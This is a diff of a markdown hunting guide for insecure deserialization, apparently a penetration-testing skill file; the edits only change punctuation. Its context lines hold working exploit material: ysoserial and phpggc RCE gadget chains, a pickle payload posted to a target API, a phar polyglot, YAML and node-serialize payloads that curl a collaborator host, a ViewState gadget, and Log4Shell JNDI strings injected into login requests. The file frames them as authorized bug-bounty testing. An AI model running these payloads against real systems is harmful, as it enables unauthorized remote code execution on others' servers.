@@ -29,19 +29,19 @@ report_count: 22
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-DESERIALIZATION: Insecure Deserialization
+# HUNT-DESERIALIZATION — Insecure Deserialization
 
 ## Crown Jewel Targets
 
 Deserialization severity depends on attacker control, reachable deserialization, available gadgets, privileges and demonstrated impact; a signal alone is not RCE.
 
 **Highest-value chains:**
-- **Java ysoserial gadget chains**; CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
-- **PHP Object Injection**; `__wakeup` / `__destruct` magic methods → file write / RCE
-- **Python pickle**; `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
-- **.NET BinaryFormatter**; TypeConfuseDelegate gadget chain → RCE
-- **Ruby Marshal.load**; Gem::Requirement, Gem::Installer gadgets → RCE
-- **JNDI injection**; Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE
+- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
+- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
+- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
+- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
+- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
+- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE
 
 ---
 
@@ -75,7 +75,7 @@ Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
 
 ## Step-by-Step Hunting Methodology
 
-### Phase 1: Java Deserialization (ysoserial)
+### Phase 1 — Java Deserialization (ysoserial)
 ```bash
 # Install ysoserial
 # Prerequisite: a previously reviewed immutable ysoserial-all.jar; stop if absent.
@@ -94,7 +94,7 @@ java -jar ysoserial-all.jar CommonsCollections6 'id' | \
 python3 shiro_exploit.py -u https://$TARGET/ -c "id"
 ```
 
-### Phase 2: PHP Object Injection
+### Phase 2 — PHP Object Injection
 ```bash
 # Find unserialize() calls in source
 grep -r "unserialize(" --include="*.php" .
@@ -109,7 +109,7 @@ php phpggc -l  # list chains
 php phpggc Laravel/RCE5 system id | base64
 ```
 
-### Phase 3: Python Pickle
+### Phase 3 — Python Pickle
 ```bash
 # Generate OOB payload
 python3 -c "
@@ -126,18 +126,18 @@ curl -s https://$TARGET/api/load-model \
   --data-binary @payload.pkl
 ```
 
-### Phase 3b: PHP phar://, Python YAML, Node deserialization
-- **PHP phar:// (no `unserialize()` call)**; older PHP runtimes could automatically deserialize metadata through filesystem access. PHP 8 stopped that automatic behavior; explicit `getMetadata()` may still deserialize. Verify the exact version/call path.
+### Phase 3b — PHP phar://, Python YAML, Node deserialization
+- **PHP phar:// (no `unserialize()` call)** — older PHP runtimes could automatically deserialize metadata through filesystem access. PHP 8 stopped that automatic behavior; explicit `getMetadata()` may still deserialize. Verify the exact version/call path.
   ```bash
   phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
   # then reach  phar://uploads/poly.jpg/x  via any fs call
   ```
-- **Python `yaml.load()` (CVE-2017-18342)**; pre-5.1 default-unsafe:
+- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
   `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
-- **Node `node-serialize` (CVE-2017-5941)**; IIFE marker in any field passed to `unserialize()`:
+- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
   `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`
 
-### Phase 4: .NET ViewState
+### Phase 4 — .NET ViewState
 ```bash
 # Check if ViewState is unsigned (MAC disabled)
 # Presence of __VIEWSTATE or absence of a separate __VIEWSTATEMAC field does
@@ -148,7 +148,7 @@ dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
   -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
 ```
 
-### Phase 5: Log4Shell / JNDI
+### Phase 5 — Log4Shell / JNDI
 ```bash
 # Test all user-controlled inputs
 COLLAB="COLLAB_HOST"
@@ -162,7 +162,7 @@ curl -s -X POST https://$TARGET/api/login \
   -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
 ```
 
-### Phase 6: Ruby Marshal
+### Phase 6 — Ruby Marshal
 ```bash
 # Look for Marshal.load in source
 grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
@@ -205,7 +205,7 @@ git clone https://github.com/pimps/JNDI-Exploit-Kit
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
 
 ## Limitations
 
